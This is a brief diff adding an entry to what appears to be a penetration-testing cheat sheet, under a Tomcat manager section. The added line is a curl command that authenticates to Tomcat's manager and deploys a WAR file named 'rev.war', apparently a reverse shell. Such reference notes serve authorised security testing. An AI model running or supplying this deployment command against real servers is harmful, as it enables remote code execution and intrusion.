@@ -276,6 +276,8 @@ Default page:
 /admin
 /manager
 /manager/html
+Exploit script manager:
+curl -u 'tomcat:[PASSWORD]' http://[IP_ADDR]:8080/manager/text/deploy?path=/[PATH] -T rev.war
 ```
 
 #### SPLUNK (8089)
